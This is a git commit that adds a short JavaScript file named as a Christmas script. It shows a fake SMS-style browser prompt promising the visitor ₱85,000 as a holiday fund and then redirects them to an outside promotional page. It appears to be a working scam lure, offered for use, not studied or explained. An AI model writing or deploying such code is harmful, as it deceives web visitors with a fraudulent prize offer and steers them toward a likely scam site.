c13278b870fe015a0d069f066d02ba3b19607508
itidnewblog4 <ukpehaitid2@gmail.com>
2025-12-23 10:00:34 +0100

    Create xmas-google-active.js

---
+++ xmas-google-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₱85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive ₱85,000 as christmas and new year holiday fund, Press Ok to withdraw cash Now ','WITHDRAW ₱85,000');
+if (password != 'WITHDRAW ₱85,000') {
+location.href='https://phlug.org/philippines-xmas.html';
+}
